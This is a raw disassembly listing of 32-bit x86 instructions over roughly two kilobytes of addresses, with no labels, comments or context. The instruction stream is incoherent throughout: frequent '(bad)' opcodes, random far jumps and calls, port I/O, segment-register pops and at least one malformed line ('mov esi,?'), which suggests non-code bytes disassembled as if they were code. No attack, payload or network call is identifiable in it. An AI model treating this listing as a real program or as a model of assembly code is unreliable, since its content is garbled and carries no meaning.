  433440:	test   DWORD PTR [eax+0x48],edx
  433443:	in     eax,0xe8
  433445:	push   0x52
  433447:	lods   eax,DWORD PTR ds:[esi]
  433448:	or     eax,0x63f89ddd
  43344d:	xchg   ebp,eax
  43344e:	scas   al,BYTE PTR es:[edi]
  43344f:	pop    esp
  433450:	aad    0xee
  433452:	pop    ss
  433453:	pop    edi
  433454:	(bad)  
  433455:	in     eax,0x7f
  433457:	hlt    
  433458:	jmp    0x9a4b:0xa017557d
  43345f:	add    DWORD PTR [edi+0x16],0xfffffffe
  433463:	scas   eax,DWORD PTR es:[edi]
  433464:	inc    edx
  433465:	and    eax,0x55a150ff
  43346a:	pop    ebp
  43346b:	sub    ebx,esi
  43346d:	jne    0x433414
  43346f:	call   0x99086857
  433474:	mov    ss,WORD PTR [edi-0x17508db9]
  43347a:	inc    ebx
  43347b:	imul   esp,DWORD PTR [edi+0x16db30bf],0xa36af30b
  433485:	in     al,dx
  433486:	nop
  433487:	lods   eax,DWORD PTR ds:[esi]
  433488:	lods   al,BYTE PTR ds:[esi]
  433489:	sub    esp,ecx
  43348b:	mov    edi,0x2bf73c62
  433490:	aaa    
  433491:	or     cl,BYTE PTR ds:0xd3bde6e0
  433497:	mov    esp,0xc5159d58
  43349c:	mov    ah,ch
  43349e:	xchg   edi,eax
  43349f:	int    0x8d
  4334a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4334a2:	loop   0x433457
  4334a4:	(bad)  
  4334a6:	scas   eax,DWORD PTR es:[edi]
  4334a7:	test   edx,esp
  4334a9:	repz jmp 0x52f027f1
  4334af:	pop    ebp
  4334b0:	fisttp DWORD PTR [eax-0xf]
  4334b3:	div    DWORD PTR [edx-0x722121ae]
  4334b9:	rol    BYTE PTR [edi],cl
  4334bb:	retf   
  4334bc:	add    al,0x1d
  4334be:	push   esp
  4334bf:	jmp    0x43347e
  4334c1:	sub    DWORD PTR [ebx-0x4e],eax
  4334c4:	xlat   BYTE PTR ds:[ebx]
  4334c5:	fs (bad) 
  4334c7:	es push cs
  4334c9:	mov    BYTE PTR [ebp-0x47],al
  4334cc:	enter  0xf12a,0xfb
  4334d0:	xchg   BYTE PTR [eax+0x10e7b98e],bh
  4334d6:	and    eax,0xe645b323
  4334db:	hlt    
  4334dc:	retf   
  4334dd:	aaa    
  4334de:	xor    DWORD PTR [esp+ebx*4+0x0],ebx
  4334e2:	or     BYTE PTR [eax-0x11],0x6f
  4334e6:	xchg   esp,eax
  4334e7:	sub    edi,DWORD PTR [edx]
  4334e9:	jno    0x4334c3
  4334eb:	mov    al,ds:0x944662e5
  4334f0:	fiadd  DWORD PTR [ebx]
  4334f2:	pop    es
  4334f3:	shl    BYTE PTR [edx+0x22d88607],0x9f
  4334fa:	inc    esi
  4334fb:	js     0x433486
  4334fd:	dec    ecx
  4334fe:	xchg   ebp,eax
  4334ff:	add    eax,0xd322dff7
  433504:	sbb    ch,0xa7
  433507:	sbb    DWORD PTR [esi+0x722b0701],edx
  43350d:	cmp    BYTE PTR [ecx],dl
  43350f:	mov    al,0x2
  433511:	mov    DWORD PTR gs:[eax],esi
  433514:	and    eax,0x2e6c5690
  433519:	and    al,0x64
  43351b:	mov    ebx,0x901cb5ec
  433520:	fld    DWORD PTR [edi+0x52a9e7d2]
  433526:	icebp  
  433527:	xchg   ebx,eax
  433528:	xchg   DWORD PTR [edx+0x3fe5f5d4],ebp
  43352e:	rcl    BYTE PTR [edx-0x39],1
  433531:	pop    eax
  433532:	jno    0x433586
  433534:	push   ds
  433535:	push   ebp
  433536:	dec    ebp
  433537:	jmp    0x4334c7
  433539:	xchg   esi,eax
  43353a:	fistp  QWORD PTR [edx+ebp*4+0x2def4396]
  433541:	ins    BYTE PTR es:[edi],dx
  433542:	cli    
  433543:	push   ecx
  433544:	xor    eax,0xfcd51c56
  433549:	xchg   DWORD PTR [esi-0x44a0a8b1],edi
  43354f:	jbe    0x4334f0
  433551:	aas    
  433552:	jge    0x433590
  433554:	ss aas 
  433556:	pop    esp
  433557:	js     0x4335d0
  433559:	gs inc edx
  43355b:	xchg   ebx,eax
  43355c:	mov    ebx,0x6e0a6cf1
  433561:	rol    BYTE PTR [esi-0x3054df24],0xd
  433568:	and    DWORD PTR [ecx+esi*1],eax
  43356b:	add    eax,0xd150a750
  433570:	sub    ah,bl
  433572:	(bad)  [eax+ebx*1+0x42]
  433576:	adc    ah,bh
  433578:	add    al,0x7e
  43357a:	push   ss
  43357b:	jb     0x433534
  43357d:	jno    0x43356b
  43357f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433580:	iret   
  433581:	jnp    0x433535
  433583:	lds    ecx,FWORD PTR [ebx-0x36]
  433586:	addr16 or esp,0xffffffc0
  43358a:	mov    ah,0x2b
  43358c:	mov    bl,0xbc
  43358e:	push   esi
  43358f:	retf   
  433590:	sbb    DWORD PTR [edi-0x1d134b1b],edx
  433596:	(bad)  
  433597:	and    edx,DWORD PTR [ebp-0x9ea8adb]
  43359d:	lds    eax,FWORD PTR [ebx]
  43359f:	dec    ebp
  4335a0:	mov    ch,0xfa
  4335a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4335a3:	stc    
  4335a4:	xor    eax,0xf32a17ad
  4335a9:	inc    esp
  4335aa:	mov    esp,0x5f1cb6e7
  4335af:	push   es
  4335b0:	loope  0x4335e9
  4335b2:	daa    
  4335b3:	jnp    0x433554
  4335b5:	rcr    edi,cl
  4335b7:	xchg   DWORD PTR [edx+0x5288223e],esi
  4335bd:	(bad)  
  4335be:	mov    edi,0x4f52b6a7
  4335c3:	mov    esp,0x7eb529ef
  4335c8:	inc    DWORD PTR [edi+0x55]
  4335cb:	jp     0x433594
  4335cd:	mov    ecx,0xa9d4b162
  4335d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4335d3:	out    dx,eax
  4335d4:	dec    eax
  4335d5:	mov    cl,0xb1
  4335d7:	out    dx,al
  4335d8:	test   al,0x54
  4335da:	dec    edx
  4335db:	gs scas eax,DWORD PTR es:[edi]
  4335dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4335de:	retf   
  4335df:	cld    
  4335e0:	mov    BYTE PTR [ebx-0x3b],bh
  4335e3:	push   DWORD PTR [edi-0x9]
  4335e6:	push   ss
  4335e7:	push   esp
  4335e8:	pop    ebx
  4335e9:	icebp  
  4335ea:	mov    fs,edx
  4335ec:	test   DWORD PTR [esi+esi*1-0x59ae40ea],0x7f6a6b69
  4335f7:	inc    edi
  4335f8:	cdq    
  4335f9:	ret    0xbf6d
  4335fc:	sbb    cl,ch
  4335fe:	mov    ah,BYTE PTR [edx-0x1c]
  433601:	test   BYTE PTR [ebx+0x7c4d2c1e],0x49
  433608:	xor    eax,0x8d160fb5
  43360d:	fst    DWORD PTR [ebp+ebp*2+0x47]
  433611:	outs   dx,DWORD PTR ds:[esi]
  433612:	mov    cl,0x1e
  433614:	mov    ss,WORD PTR [edi+eiz*2-0x2563aadf]
  43361b:	sub    edi,DWORD PTR [edx-0x44]
  43361e:	mov    bh,0x7d
  433620:	mov    bh,0xd0
  433622:	loopne 0x43369a
  433624:	mov    ebp,ebx
  433626:	pop    ebx
  433627:	mov    edi,edi
  433629:	iret   
  43362a:	xchg   esi,eax
  43362b:	ins    DWORD PTR es:[edi],dx
  43362c:	std    
  43362d:	inc    edx
  43362e:	(bad)  
  43362f:	shr    dh,1
  433631:	(bad)  
  433632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433633:	stos   BYTE PTR es:[edi],al
  433634:	out    dx,al
  433635:	sahf   
  433636:	aad    0xea
  433638:	outs   dx,DWORD PTR ds:[esi]
  433639:	(bad)  
  43363a:	mov    bh,0x5a
  43363c:	call   DWORD PTR [edi-0x280d15d1]
  433642:	addr16 retf 
  433644:	imul   ecx,DWORD PTR [eax+ebx*1-0x56603bc7],0x7f
  43364c:	out    dx,eax
  43364d:	fnstsw WORD PTR [edi-0x42]
  433650:	mov    esp,0xfbf576c2
  433655:	lds    esi,FWORD PTR [edi-0x13]
  433658:	(bad)
  43365b:	jg     0x43364e
  43365d:	test   DWORD PTR [ecx+esi*8+0x77],0x172feef2
  433665:	iret   
  433666:	jmp    0x433692
  433668:	add    al,0xc1
  43366a:	mov    esi,?
  43366c:	jbe    0x433664
  43366e:	or     esi,ebp
  433670:	mov    edi,0x6298893b
  433675:	jecxz  0x433626
  433677:	pop    ss
  433678:	arpl   WORD PTR [ecx-0x4a8a03ad],di
  43367e:	mov    eax,0xacf8a07e
  433683:	mov    bh,0x7c
  433685:	mov    dl,0x97
  433687:	add    bl,ch
  433689:	xchg   edx,eax
  43368a:	mov    ah,0x95
  43368c:	inc    edx
  43368d:	(bad)  
  43368e:	sub    al,0xfe
  433690:	dec    ebp
  433691:	xchg   ebp,eax
  433692:	dec    ebp
  433693:	retf   0x9f42
  433696:	ror    ebp,1
  433698:	shl    bl,cl
  43369a:	in     eax,0x53
  43369c:	cwde   
  43369d:	xor    ah,ah
  43369f:	imul   edx,DWORD PTR [ebx+0x4d4fd9c3],0x6cb20a02
  4336a9:	retf   0xdd94
  4336ac:	push   esp
  4336ad:	push   esp
  4336ae:	stos   BYTE PTR es:[edi],al
  4336af:	xchg   esi,eax
  4336b0:	xchg   ebx,eax
  4336b1:	jl     0x43363b
  4336b3:	xchg   esi,eax
  4336b4:	add    esp,esp
  4336b6:	loop   0x4336d8
  4336b8:	test   eax,0x8d223989
  4336bd:	sbb    edx,eax
  4336bf:	adc    cl,dl
  4336c1:	aaa    
  4336c2:	pushf  
  4336c3:	clc    
  4336c4:	lock xor eax,0xf4c0a872
  4336ca:	add    eax,0x85fd98cc
  4336cf:	inc    esi
  4336d0:	push   eax
  4336d1:	test   BYTE PTR [ecx],0x14
  4336d4:	shl    DWORD PTR [eax-0x193d5b71],cl
  4336da:	xchg   esi,eax
  4336db:	push   cs
  4336dc:	adc    al,BYTE PTR [esp+eiz*8+0x61]
  4336e0:	aas    
  4336e1:	push   esp
  4336e2:	adc    al,0x68
  4336e4:	mov    cl,bh
  4336e6:	inc    edi
  4336e7:	push   edx
  4336e8:	or     DWORD PTR [ecx+0x95b3963],ebx
  4336ee:	ror    BYTE PTR [edx+ebp*1],cl
  4336f1:	jno    0x433709
  4336f3:	xor    BYTE PTR [ebp+0x2c],al
  4336f6:	shr    DWORD PTR [esi],0x4f
  4336f9:	enter  0x5092,0xf2
  4336fd:	test   eax,0x9cd72fd9
  433702:	sbb    ecx,DWORD PTR [edx+0xb1555e7]
  433708:	(bad)  
  433709:	arpl   WORD PTR [ebx-0x73],ax
  43370c:	fidivr DWORD PTR [edx-0x2]
  43370f:	fild   QWORD PTR [eax+0x4b59a6a2]
  433715:	outs   dx,DWORD PTR ds:[esi]
  433716:	(bad)  
  433717:	popa   
  433718:	popa   
  433719:	clc    
  43371a:	adc    eax,0x47c75db6
  43371f:	mov    ah,0x7d
  433721:	jae    0x43377d
  433723:	scas   eax,DWORD PTR es:[edi]
  433724:	popf   
  433725:	jge    0x433796
  433727:	pop    ecx
  433728:	retf   0x44ee
  43372b:	mov    ebx,0xf0e4c76e
  433730:	jae    0x433779
  433732:	scas   al,BYTE PTR es:[edi]
  433733:	jle    0x433780
  433735:	sbb    dh,BYTE PTR [ebx+0x5e]
  433738:	pop    ebp
  433739:	pop    ss
  43373a:	aad    0x99
  43373c:	enter  0x3a47,0xa1
  433740:	ror    ecx,cl
  433742:	jg     0x43377d
  433744:	add    al,0x40
  433746:	fwait
  433747:	sub    al,0x5d
  433749:	jno    0x4336dd
  43374b:	ins    DWORD PTR es:[edi],dx
  43374c:	lds    esp,FWORD PTR [edi+esi*8+0xc1082c8]
  433753:	add    al,0x39
  433755:	push   ss
  433756:	and    al,0x69
  433758:	lods   al,BYTE PTR ds:[esi]
  433759:	leave  
  43375a:	icebp  
  43375b:	jbe    0x433747
  43375d:	sub    al,0x50
  43375f:	ret    0xc09
  433762:	call   FWORD PTR [edx+0x26]
  433765:	cld    
  433766:	sub    al,bh
  433768:	inc    eax
  433769:	jge    0x4337e6
  43376b:	adc    BYTE PTR [esp+eiz*4+0x62],0xa3
  433770:	outs   dx,BYTE PTR ds:[esi]
  433771:	push   esi
  433772:	inc    esi
  433773:	sbb    edx,DWORD PTR [eax]
  433775:	pop    esp
  433776:	mov    al,ds:0xca641739
  43377b:	aaa    
  43377c:	sub    al,bh
  43377e:	push   eax
  43377f:	xor    eax,0x4f393938
  433784:	leave  
  433785:	jo     0x4337f5
  433787:	inc    ebp
  433788:	cmp    ebx,DWORD PTR [esi]
  43378a:	mov    BYTE PTR [ecx],dh
  43378c:	add    BYTE PTR [edi+0x369edef1],dl
  433792:	popf   
  433793:	clc    
  433794:	into   
  433795:	ja     0x433741
  433797:	icebp  
  433798:	cdq    
  433799:	addr16 push esp
  43379b:	icebp  
  43379c:	inc    BYTE PTR [edi+0x54]
  43379f:	jmp    0x7977:0x4084285c
  4337a6:	and    DWORD PTR [edx+ebx*8],0xfffffff7
  4337aa:	retf   0xc8f2
  4337ad:	xchg   esp,eax
  4337ae:	(bad)
  4337b3:	ret    0xb2d5
  4337b6:	sub    DWORD PTR [eax+0x76],edx
  4337b9:	fcom   DWORD PTR [ebp-0x18d834a6]
  4337bf:	mov    ebp,0x1cb17593
  4337c4:	sbb    DWORD PTR [ecx+0x4f4d09d2],ebp
  4337ca:	mov    ss,WORD PTR [ebp-0x282423a1]
  4337d0:	push   ebp
  4337d1:	pushf  
  4337d2:	out    dx,al
  4337d3:	xchg   DWORD PTR [ebp+ebx*2-0x4190d0e6],esi
  4337da:	mov    ebp,0xbb3537a2
  4337df:	iret   
  4337e0:	sub    BYTE PTR [ebp+0x75b9d9d5],dl
  4337e6:	push   esi
  4337e7:	shl    ebp,cl
  4337e9:	jg     0x433840
  4337eb:	fcmovne st,st(3)
  4337ed:	jae    0x4337d9
  4337ef:	cli    
  4337f0:	enter  0x6aaf,0x6a
  4337f4:	jle    0x43384b
  4337f6:	pop    ss
  4337f7:	push   ss
  4337f8:	push   esi
  4337f9:	out    dx,eax
  4337fa:	pop    ss
  4337fb:	cld    
  4337fc:	and    al,0x3
  4337fe:	jne    0x43383d
  433800:	ficomp DWORD PTR [edx+0x7ee795c2]
  433806:	jecxz  0x433843
  433808:	push   ebp
  433809:	stc    
  43380a:	enter  0xdd09,0xfd
  43380e:	sti    
  43380f:	call   FWORD PTR [ebp+esi*1-0x41]
  433813:	clc    
  433814:	sub    DWORD PTR [ebp+0x76],edx
  433817:	jge    0x433859
  433819:	mov    ebx,0x45565f63
  43381e:	jmp    0x4337d0
  433820:	div    BYTE PTR [edi]
  433822:	ja     0x4337ef
  433824:	test   BYTE PTR [esi-0x2ad0ab17],ch
  43382a:	xor    eax,0xfa6d7f69
  43382f:	push   ds
  433830:	and    BYTE PTR [esi+0xbfb46b2],bh
  433836:	push   ebx
  433837:	stos   BYTE PTR es:[edi],al
  433838:	push   0xb3e6d2ae
  43383d:	lahf   
  43383e:	shl    esi,1
  433840:	in     eax,0x5
  433842:	push   ebp
  433843:	cmc    
  433844:	xor    eax,0xfdbde6a9
  433849:	in     eax,0xac
  43384b:	rcr    ch,1
  43384d:	cdq    
  43384e:	push   ds
  43384f:	in     eax,dx
  433850:	popf   
  433851:	std    
  433852:	mov    eax,0x82f6bf16
  433857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433858:	jg     0x433857
  43385a:	aaa    
  43385b:	jne    0x433844
  43385d:	retf   0x66bc
  433860:	addr16 out dx,al
  433862:	xchg   esi,eax
  433863:	fisttp WORD PTR [edi+0x65]
  433866:	pop    esi
  433867:	xor    al,0x0
  433869:	pushf  
  43386a:	jl     0x4338d4
  43386c:	(bad)
  433870:	pop    esp
  433871:	sub    eax,0xe3066b63
  433876:	outs   dx,DWORD PTR ds:[esi]
  433877:	mov    ah,0x62
  433879:	call   0x11cdc254
  43387e:	and    eax,0xc5e15d60
  433883:	daa    
  433884:	cmp    edx,DWORD PTR [ebx]
  433886:	es das 
  433888:	not    dh
  43388a:	pop    edx
  43388b:	in     al,dx
  43388c:	mov    ds:0x5abfb123,eax
  433891:	in     al,0x68
  433893:	add    BYTE PTR [edi],al
  433895:	into   
  433896:	call   0x101:0x3b2cfe8c
  43389d:	adc    BYTE PTR [eax-0x77b27e1c],dl
  4338a3:	add    al,al
  4338a5:	mov    esi,0x8b00a0a7
  4338aa:	or     ah,BYTE PTR [edi+0x21]
  4338ad:	sbb    al,BYTE PTR [edx]
  4338af:	into   
  4338b0:	inc    esp
  4338b1:	retf   0xad0f
  4338b4:	mov    BYTE PTR [edx],0x83
  4338b7:	cmp    DWORD PTR [esi-0x756011cb],0xe
  4338be:	jbe    0x433906
  4338c0:	daa    
  4338c1:	scas   eax,DWORD PTR es:[edi]
  4338c2:	retf   0x1bd2
  4338c5:	cwde   
  4338c6:	and    ebx,DWORD PTR [edx+0x4]
  4338c9:	xchg   ecx,eax
  4338ca:	add    al,0x3c
  4338cc:	aam    0x43
  4338ce:	mov    cl,0x1
  4338d0:	sbb    ah,BYTE PTR [edx-0x50]
  4338d3:	lahf   
  4338d4:	jns    0x4338b8
  4338d6:	pushf  
  4338d7:	push   es
  4338d8:	aas    
  4338d9:	div    DWORD PTR [edi+0x4678d0d4]
  4338df:	jne    0x433896
  4338e1:	cmp    DWORD PTR [edx-0x1d],0xfffffffd
  4338e5:	fbld   TBYTE PTR [ebp-0x21d1684f]
  4338eb:	dec    edi
  4338ec:	push   0x17c1969a
  4338f1:	aam    0x51
  4338f3:	sub    eax,ebp
  4338f5:	and    ch,dh
  4338f7:	(bad)  
  4338f8:	and    BYTE PTR [eax+0x7195a87f],al
  4338fe:	lock or BYTE PTR [esi-0x60a01727],ch
  433905:	dec    esp
  433906:	pushf  
  433907:	mov    DWORD PTR [ebx-0x75b5f56c],esp
  43390d:	jmp    0x433957
  43390f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433910:	inc    edx
  433911:	int    0x4f
  433913:	iret   
  433914:	ds sub al,0x17
  433917:	fiadd  DWORD PTR [ebx+eax*2+0x40]
  43391b:	sub    dh,BYTE PTR [edi-0x1cd98c39]
  433921:	stc    
  433922:	dec    esp
  433923:	je     0x4338b2
  433925:	lods   al,BYTE PTR ds:[esi]
  433926:	mov    dh,0x11
  433928:	jbe    0x4338ef
  43392a:	not    DWORD PTR [edx-0x4b8f24ea]
  433930:	cmovge ebp,DWORD PTR [edx+edi*1+0xe57b0c6]
  433938:	xor    DWORD PTR [ecx],ebp
  43393a:	fiadd  WORD PTR [ecx-0x2e]
  43393d:	aad    0xf5
  43393f:	push   0x43d36a5f
  433944:	and    DWORD PTR [edx+edx*8],ebp
  433947:	ja     0x433972
  433949:	(bad)  
  43394a:	test   DWORD PTR [edx-0xc],0xc384247d
  433951:	pop    esi
  433952:	hlt    
  433953:	mov    eax,ds:0xa40afa33
  433958:	clc    
  433959:	cwde   
  43395a:	int3   
  43395b:	cmp    BYTE PTR [ebx-0x68108556],dl
  433961:	iret   
  433962:	out    0xfd,al
  433964:	in     al,0xdb
  433966:	mov    ebx,0xe820087f
  43396b:	pop    eax
  43396c:	clc    
  43396d:	cmp    BYTE PTR [eax+0xf17f56b],cl
  433973:	mov    esp,esi
  433975:	mov    bh,0xf5
  433977:	or     eax,0x9968801
  43397c:	ret    
  43397d:	adc    al,0xf7
  43397f:	push   edx
  433980:	pop    es
  433981:	jno    0x4339c5
  433983:	ss pop ebx
  433985:	and    BYTE PTR [edi-0x1b9c6c57],ah
  43398b:	or     BYTE PTR [esi+0x34],dl
  43398e:	mov    eax,0x6aeb597a
  433993:	xchg   esi,eax
  433994:	ins    DWORD PTR es:[edi],dx
  433995:	popa   
  433996:	nop
  433997:	stos   BYTE PTR es:[edi],al
  433998:	adc    ch,0xd0
  43399b:	cmp    BYTE PTR [ecx+0x73],cl
  43399e:	lods   eax,DWORD PTR ds:[si]
  4339a0:	mov    al,0xbe
  4339a2:	jns    0x4339e3
  4339a4:	jo     0x433a01
  4339a6:	cli    
  4339a7:	cmp    DWORD PTR [ecx],esp
  4339a9:	fwait
  4339aa:	ins    DWORD PTR es:[edi],dx
  4339ab:	inc    eax
  4339ac:	jge    0x4339d9
  4339ae:	mov    ds:0xe7316b5d,al
  4339b3:	ja     0x433a19
  4339b5:	cmc    
  4339b6:	sbb    eax,0x216d1de7
  4339bb:	cmp    al,0x5b
  4339bd:	xchg   ecx,eax
  4339be:	mov    ch,0x1
  4339c0:	inc    esp
  4339c1:	out    0x4a,al
  4339c3:	mov    ah,0x7f
  4339c5:	dec    ecx
  4339c6:	ss dec ecx
  4339c8:	rcl    esp,1
  4339ca:	cmp    DWORD PTR [esi+edx*8+0x394ebae2],ebx
  4339d1:	pop    ebx
  4339d2:	mov    al,0x4b
  4339d4:	scas   al,BYTE PTR es:[edi]
  4339d5:	mov    cl,BYTE PTR [edi+eax*1]
  4339d8:	and    al,0x50
  4339da:	std    
  4339db:	lds    ebx,FWORD PTR [eax]
  4339dd:	fwait
  4339de:	xor    cl,BYTE PTR [esi]
  4339e0:	pusha  
  4339e1:	and    dl,dh
  4339e3:	cmp    eax,0x9da8a090
  4339e8:	or     al,0x16
  4339ea:	adc    esi,DWORD PTR [ebp+0x57]
  4339ed:	mov    dh,0xfb
  4339ef:	adc    DWORD PTR [eax],eax
  4339f1:	mov    ecx,0x6e418a
  4339f6:	push   0x2e
  4339f8:	nop
  4339f9:	loopne 0x4339c1
  4339fb:	pop    eax
  4339fc:	loopne 0x4339ce
  4339fe:	inc    edi
  4339ff:	ins    DWORD PTR es:[edi],dx
  433a00:	leave  
  433a01:	in     eax,0xb8
  433a03:	fcom   DWORD PTR [eax+0x5d]
  433a06:	xor    ch,bh
  433a08:	cmp    al,0xea
  433a0a:	int3   
  433a0b:	xor    ecx,0xfffffffb
  433a0e:	outs   dx,BYTE PTR ds:[esi]
  433a0f:	idiv   BYTE PTR [ebp+0x5b]
  433a12:	ins    BYTE PTR es:[edi],dx
  433a13:	sbb    ch,BYTE PTR [eax+0x61629ba8]
  433a19:	call   FWORD PTR [eax+0x7b]
  433a1c:	fwait
  433a1d:	sbb    cl,BYTE PTR [esi+0x37b5eb77]
  433a23:	(bad)  
  433a24:	mov    ah,0xb0
  433a26:	mov    esi,0x7cd61f75
  433a2b:	pop    ebp
  433a2c:	push   cs
  433a2d:	jnp    0x4339d3
  433a2f:	mov    dh,0xdf
  433a31:	xchg   edx,eax
  433a32:	sbb    eax,0xaf2da49b
  433a37:	retf   
  433a38:	dec    esi
  433a39:	sbb    BYTE PTR [eax],dl
  433a3b:	pop    eax
  433a3c:	aaa    
  433a3d:	fs aad 0x2b
  433a40:	fstp   QWORD PTR [edi+0x7123844c]
  433a46:	jge    0x4339e2
  433a48:	in     al,dx
  433a49:	inc    ebx
  433a4a:	jb     0x433a88
  433a4c:	push   ss
  433a4d:	lods   eax,DWORD PTR ds:[esi]
  433a4e:	xchg   DWORD PTR [edx],ebp
  433a50:	cmp    DWORD PTR [ebp+0x62875cd8],esp
  433a56:	sub    al,0x7
  433a59:	ins    BYTE PTR es:[edi],dx
  433a5a:	cmp    al,BYTE PTR [eax-0x5a]
  433a5d:	out    dx,eax
  433a5e:	inc    esp
  433a5f:	aas    
  433a60:	mov    edx,0xc4894d65
  433a65:	sbb    esi,DWORD PTR [esi]
  433a67:	mov    ds,WORD PTR ss:[esi-0x6e74e6a7]
  433a6e:	scas   al,BYTE PTR es:[edi]
  433a6f:	sbb    edx,DWORD PTR [eax+0x4131fd73]
  433a75:	shl    BYTE PTR ds:0x2bf9f1c3,cl
  433a7b:	mov    edx,0xcf4d88e7
  433a80:	and    ecx,DWORD PTR [esi+0x7c]
  433a83:	cmp    edx,DWORD PTR [esi]
  433a85:	les    esp,FWORD PTR [esi+0x6c]
  433a88:	cli    
  433a89:	jmp    0x8caaadf6
  433a8e:	in     eax,0x94
  433a90:	ins    BYTE PTR es:[edi],dx
  433a91:	mul    al
  433a93:	mov    WORD PTR [ebp+0x7f],cs
  433a96:	bswap  ecx
  433a98:	dec    esi
  433a99:	pop    edx
  433a9a:	ss push es
  433a9c:	ds sbb ecx,ecx
  433a9f:	clc    
  433aa0:	adc    DWORD PTR [eax+0x6c481182],ebx
  433aa6:	bound  ecx,QWORD PTR [eax]
  433aa8:	mov    al,gs:0x9190af96
  433aae:	outs   dx,DWORD PTR ds:[esi]
  433aaf:	xchg   esp,eax
  433ab0:	sbb    DWORD PTR [ebx-0x1f],esp
  433ab3:	push   edi
  433ab4:	leave  
  433ab5:	sbb    bl,BYTE PTR [ecx-0x23f98a4e]
  433abb:	adc    eax,0x20779655
  433ac0:	pop    esp
  433ac1:	clc    
  433ac2:	or     al,0x6d
  433ac4:	sub    BYTE PTR [edi+0x5f],bl
  433ac7:	pusha  
  433ac8:	dec    ebp
  433ac9:	adc    BYTE PTR [esi-0x76264dd3],dh
  433acf:	rcl    DWORD PTR [ebp-0x7df49695],cl
  433ad5:	add    DWORD PTR [eax],esi
  433ad7:	push   cs
  433ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433ad9:	sbb    ah,BYTE PTR [ebp-0x4d2c2614]
  433adf:	mov    bl,0x77
  433ae1:	ss pop ebx
  433ae3:	add    edx,DWORD PTR [edx+ebp*2+0x4e]
  433ae7:	out    dx,eax
  433ae8:	sbb    BYTE PTR [ebp-0x104ce431],cl
  433aee:	ror    DWORD PTR [esi-0x531c9e7f],1
  433af4:	mov    ds:0xe89a1abc,eax
  433af9:	sahf   
  433afa:	int3   
  433afb:	clc    
  433afc:	fist   DWORD PTR [edx]
  433afe:	jnp    0x433a88
  433b00:	xor    eax,0x3cf2d8c7
  433b05:	ret    0xf1
  433b08:	jmp    0xd8249d95
  433b0d:	imul   edx,DWORD PTR [eax-0x2a37776d],0x69
  433b14:	mov    DWORD PTR [ebp+0x5d],esi
  433b17:	push   ss
  433b18:	add    al,bl
  433b1a:	push   ss
  433b1b:	jns    0x433ada
  433b1d:	cmp    BYTE PTR [eax],bl
  433b1f:	enterw 0x5be6,0x95
  433b24:	mov    ebp,DWORD PTR [ebx]
  433b26:	push   edx
  433b27:	pop    esi
  433b28:	mov    BYTE PTR [ecx+0x50],cl
  433b2b:	mov    esp,0x6a062fa0
  433b30:	pop    esp
  433b31:	xchg   esi,eax
  433b32:	out    dx,al
  433b33:	cwde   
  433b34:	adc    ah,al
  433b36:	popf   
  433b37:	sar    ebp,0x5f
  433b3a:	mov    edi,ebx
  433b3c:	xchg   edx,eax
  433b3d:	mov    edx,0x7b187406
  433b42:	test   al,0x26
  433b44:	sahf   
  433b45:	inc    ebp
  433b46:	push   ebp
  433b47:	xchg   ebx,eax
  433b48:	push   esi
  433b49:	stc    
  433b4a:	inc    esp
  433b4b:	add    ecx,eax
  433b4d:	(bad)  
  433b4e:	push   ss
  433b4f:	xlat   BYTE PTR ds:[ebx]
  433b50:	mov    bh,0x96
  433b52:	ret    0xbf53
  433b55:	jg     0x433b46
  433b57:	sbb    eax,0xfab1d135
  433b5c:	ins    BYTE PTR es:[edi],dx
  433b5d:	add    dh,BYTE PTR [edi+0x65263263]
  433b63:	repz and cl,BYTE PTR ds:0x3458e5f8
  433b6a:	inc    eax
  433b6b:	fs sti 
  433b6d:	mov    ds:0xf33b842d,eax
  433b72:	jmp    0x433b3c
  433b74:	dec    ebp
  433b75:	cwde   
  433b76:	xchg   ebx,eax
  433b77:	stc    
  433b78:	aad    0x71
  433b7a:	pop    esp
  433b7b:	mov    dh,0xc5
  433b7d:	repz pop ecx
  433b7f:	in     al,0x49
  433b81:	shl    BYTE PTR [edx+eax*4],1
  433b84:	int3   
  433b85:	and    al,0x48
  433b87:	jp     0x433b2b
  433b89:	int    0x33
  433b8b:	mov    dl,0xa7
  433b8d:	lahf   
  433b8e:	dec    ebp
  433b8f:	dec    ebx
  433b90:	fcom   DWORD PTR [eax+ebp*2]
  433b93:	es ret 0x4a76
  433b97:	faddp  st(0),st
  433b99:	adc    BYTE PTR [ecx],bh
  433b9b:	scas   al,BYTE PTR es:[edi]
  433b9c:	inc    ebp
  433b9d:	pop    ebx
  433b9e:	jmp    0x2771:0xb4865ae5
  433ba5:	fimul  WORD PTR [edi+0x49]
  433ba8:	mov    bh,0x84
  433baa:	cmp    bl,al
  433bac:	push   ecx
  433bad:	dec    ecx
  433bae:	jge    0x433be8
  433bb0:	ss das 
  433bb2:	fiadd  DWORD PTR [esi+0x4a0059e2]
  433bb8:	cmp    BYTE PTR [ecx+0x51],bh
  433bbb:	sub    eax,0xe47b17b1
  433bc0:	stos   BYTE PTR es:[edi],al
  433bc1:	push   ecx
  433bc2:	and    BYTE PTR [ecx+ebx*2],dh
  433bc5:	(bad)  
  433bc7:	fsincos 
  433bc9:	loope  0x433bde
  433bcb:	loopne 0x433c06
  433bcd:	pushf  
  433bce:	out    0x7b,al
  433bd0:	mov    dl,0x7a
  433bd2:	mov    ecx,DWORD PTR [edi+0x69]
  433bd5:	inc    ecx
  433bd6:	scas   al,BYTE PTR es:[edi]
  433bd7:	aaa    
  433bd8:	or     ebx,eax
  433bda:	in     eax,dx
  433bdb:	fisttp DWORD PTR [edi-0x3a]
  433bde:	cmp    al,0xd5
  433be0:	sbb    al,0xf5
  433be2:	xchg   ebp,eax
  433be3:	int    0x84
  433be5:	imul   edx,DWORD PTR [esi+0x13],0xf18dafed
  433bec:	in     eax,dx
  433bed:	xchg   ebp,eax
  433bee:	xor    ebp,ebx
  433bf0:	cmp    BYTE PTR [ecx+0x39],dl
  433bf3:	xor    eax,0x574c0319
  433bf8:	xor    al,0x19
  433bfa:	(bad)  
